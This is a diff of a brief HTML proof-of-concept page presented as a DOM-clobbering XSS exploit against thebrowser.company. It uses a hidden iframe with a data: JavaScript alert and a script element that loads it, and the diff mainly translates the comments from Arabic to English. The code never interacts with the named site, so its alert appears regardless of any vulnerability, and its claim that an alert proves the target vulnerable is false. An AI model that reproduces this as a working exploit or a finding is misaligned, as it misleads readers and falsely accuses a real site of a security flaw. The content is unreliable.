@@ -1,26 +1,29 @@
-<!-- PoC HTML Page to Trigger Remote DOM XSS via iframe clobbering -->
+<!-- PoC: Remote DOM XSS via DOM Clobbering (thebrowser.company) -->
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Remote DOM XSS PoC</title>
+  <title>Remote DOM XSS - thebrowser.company</title>
+  <meta charset="UTF-8">
 </head>
 <body>
-  <h2>Testing DOM Clobbering on thebrowser.company</h2>
+  <h2>PoC: Remote DOM XSS Exploit</h2>
+  <p>If this page triggers an alert, the target site is vulnerable to DOM XSS via iframe clobbering.</p>
 
+  <!-- Hidden iframe with DOM clobbering setup -->
   <iframe 
     id="my_script" 
     name="src" 
-    src="data:text/javascript,alert('Remote DOM XSS!')" 
-    style="display:none">
+    src="data:text/javascript,alert('Remote DOM XSS!')"
+    style="display: none">
   </iframe>
 
   <script>
-    // محاولة ربط العنصر مع window
-    window.my_script = document.getElementById('my_script');
+    // Reference iframe by ID (clobbering)
+    window.my_script = document.getElementById("my_script");
 
-    // إنشاء عنصر سكربت يشير إلى iframe.src
-    let s = document.createElement('script');
-    s.src = my_script.src; // المرجو أن يكون "data:text/javascript,..."
+    // Create <script> element whose src points to the iframe.src
+    var s = document.createElement("script");
+    s.src = my_script.src; // Will point to data:text/javascript,...
     document.body.appendChild(s);
   </script>
 </body>
